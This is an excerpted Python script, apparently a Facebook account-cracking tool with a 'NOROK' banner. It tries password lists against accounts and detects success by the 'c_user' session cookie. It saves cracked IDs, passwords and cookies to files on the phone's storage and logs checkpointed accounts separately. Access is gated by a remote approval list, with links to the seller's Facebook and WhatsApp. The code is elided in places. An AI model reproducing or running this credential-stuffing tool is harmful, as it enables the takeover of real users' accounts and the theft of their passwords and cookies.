...
88b 88  dP"Yb  88""Yb  dP"Yb  88  dP 
88Yb88 dP   Yb 88__dP dP   Yb 88odP  
88 Y88 Yb   dP 88"Yb  Yb   dP 88"Yb  
88  Y8  YbodP  88  Yb  YbodP  88  Yb 
        ...
        for ps in pwx:
          ...
          'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/Norok-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                oks.append(uid)
                break
...
#              print(f"\x1b[38;5;196m[SABBIR-CP💔] {uid}|{ps}")
                open('/sdcard/Norok-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
...
def shoha_menu():
    ...
    id = "5".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/Norokfj/Approval.txt").text
    if id in DARK:
        Main()
    else:
        os.system("clear")
        os.system("xdg-open https://www.facebook.com/profile.php?id=100047627917872")
        time.sleep(3.0)
        ...
        os.system("xdg-open https://wa.me/8801814092702")
        shoha_menu()   
shoha_menu()
